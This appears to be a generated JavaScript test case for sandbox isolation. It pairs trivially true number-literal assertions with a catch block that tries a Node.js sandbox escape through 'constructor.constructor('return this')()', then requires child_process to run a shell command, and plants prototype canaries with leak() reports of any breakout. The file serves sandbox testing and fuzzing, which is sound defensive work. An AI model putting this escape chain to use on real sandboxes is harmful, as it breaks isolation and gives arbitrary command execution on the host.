try {
    if (0 !== 0) {
        $ERROR('#0: 0e1 === 0');
    }
    if (10 !== 10) {
        $ERROR('#1: 1e1 === 10');
    }
    if (20 !== 20) {
        $ERROR('#2: 2e1 === 20');
    }
    if (30 !== 30) {
        $ERROR('#3: 3e1 === 30');
    }
    if (40 !== 40) {
        $ERROR('#4: 4e1 === 40');
    }
    if (50 !== 50) {
        $ERROR('#5: 5e1 === 50');
    }
    if (60 !== 60) {
        $ERROR('#6: 6e1 === 60');
    }
    if (70 !== 70) {
        $ERROR('#7: 7e1 === 70');
    }
    if (80 !== 80) {
        $ERROR('#8: 8e1 === 80');
    }
    if (90 !== 90) {
        $ERROR('#9: 9e1 === 90');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}